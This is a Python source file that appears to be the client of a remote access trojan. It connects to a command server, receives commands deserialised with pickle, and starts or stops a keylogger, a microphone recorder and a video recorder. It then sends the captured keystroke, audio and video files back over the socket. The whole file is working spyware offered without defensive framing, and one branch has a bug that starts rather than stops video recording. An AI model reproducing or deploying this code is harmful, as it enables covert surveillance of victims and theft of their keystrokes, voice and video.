import socket, pickle, subprocess, tqdm, os
import keylogger, threading, recorder, vid_rec


try:
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect(('127.0.0.1', 44101))

    keylog_activated = False
    voice_activated = False
    video_activated = False

    SEPARATOR = "<SEPARATOR>"
    BUFFER_SIZE = 1024

    while True:
        data = client.recv(5000)
        cmd = pickle.loads(data)
        if cmd == ['start', 'keylogger']:
            if keylog_activated == False:
                try:
                    start_logger = threading.Thread(target=keylogger.start_keylogger)
                    start_logger.start()
                    client.send(b"[+]keylogger started")
                    keylog_activated = True
                    # print("keylogger started")
                except Exception as err:
                    client.send(f"[-]keylogger start failure: {str(err)}".encode('utf-8')) 
            else:
                client.send(b'[-] Keylogger program already started')
        elif cmd == ['stop', 'keylogger']:
            if keylog_activated == True:
                try:
                    stop_logger = threading.Thread(target=keylogger.stop_keylogger)
                    stop_logger.start()
                    client.send(b"keylogger stopped")
                    keylog_activated = False
                    # print("keylogger stopped")
                except Exception as err:
                    client.send(f"[-]keylogger stop failure: {str(err)}".encode('utf-8'))  
            else:
                client.send(b'[-] keylogger program not started')
        elif cmd == ['get', 'keylog']:
            try:
                filename = "keylog.txt"
                filesize = os.path.getsize(filename)
                client.send(f"{filename}{SEPARATOR}{filesize}".encode())

                with open(filename, 'rb') as f:
                    while True:
                        bytes_read = f.read(BUFFER_SIZE)
                        if not bytes_read:
                            break
                        client.sendall(bytes_read)
                # print("keylog file sent")
            except Exception as err:
                client.send(f"[-]file download failure: {str(err)}".encode('utf-8'))   
        elif cmd == ['start', 'vorec']:
            if voice_activated == False:
                try:
                    start_voice_rec = threading.Thread(target=recorder.start_rec)
                    start_voice_rec.start()
                    client.send(b"voice recorder started")
                    voice_activated = True
                    # print("voice recorder started")
                except Exception as err:
                    client.send(f"[-]voice recorder start failure: {str(err)}".encode('utf-8'))
            else:
               client.send(b'[-] voice record program already started') 
        elif cmd == ['stop', 'vorec']:
            if voice_activated == True:
                try:
                    stop_voice_rec = threading.Thread(target=recorder.stop_rec)
                    stop_voice_rec.start()
                    client.send(b"voice recorder stopped")
                    voice_activated = False
                    # print("voice recorder stopped")
                except Exception as err:
                    client.send(f"[-]voice recorder stop failure: {str(err)}".encode('utf-8'))
            else:
                client.send(b'[-] voice record program not started')
        elif cmd == ['get', 'vorec']:
            try:
                filename = "output.wav"
                filesize = os.path.getsize(filename)
                client.send(f"{filename}{SEPARATOR}{filesize}".encode())

                with open(filename, 'rb') as f:
                    while True:
                        bytes_read = f.read(BUFFER_SIZE)
                        if not bytes_read:
                            break
                        client.sendall(bytes_read)
                # print("Audio file sent")
            except Exception as err:
                client.send(f"[-]file download failure: {str(err)}".encode('utf-8'))   
        elif cmd == ['start', 'vidrec']:
            if video_activated == False:
                try:
                    start_video_rec = threading.Thread(target=vid_rec.start_vid_rec)
                    start_video_rec.start()
                    client.send(b"video recorder started")
                    video_activated = True
                    # print("video recorder started")
                except Exception as err:
                    client.send(f"[-]video recorder start failure: {str(err)}".encode('utf-8'))
            else:
                client.send(b'[-] video record program already started')  
        elif cmd == ['stop', 'vidrec']:
            if video_activated == True:
                try:
                    stop_video_rec = threading.Thread(target=vid_rec.start_vid_rec)
                    stop_video_rec.start()
                    client.send(b"video recorder stopped")
                    video_activated = False
                    # print("video recorder stopped")
                except Exception as err:
                    client.send(f"[-]video recorder stop failure: {str(err)}".encode('utf-8'))
            else:
                client.send(b'[-] video record program not started') 
        elif cmd == ['get', 'vidrec']:
            try:
                filename = "output.mp4"
                filesize = os.path.getsize(filename)
                client.send(f"{filename}{SEPARATOR}{filesize}".encode())

                with open(filename, 'rb') as f:
                    while True:
                        bytes_read = f.read(BUFFER_SIZE)
                        if not bytes_read:
                            break
                        client.sendall(bytes_read)
                # print("Video file sent")
            except Exception as err:
                client.send(f"[-]file download failure: {str(err)}".encode('utf-8'))    
        else:
            client.send(b"Unknown command")
        
except Exception as err:
    pass
finally:
    client.close()

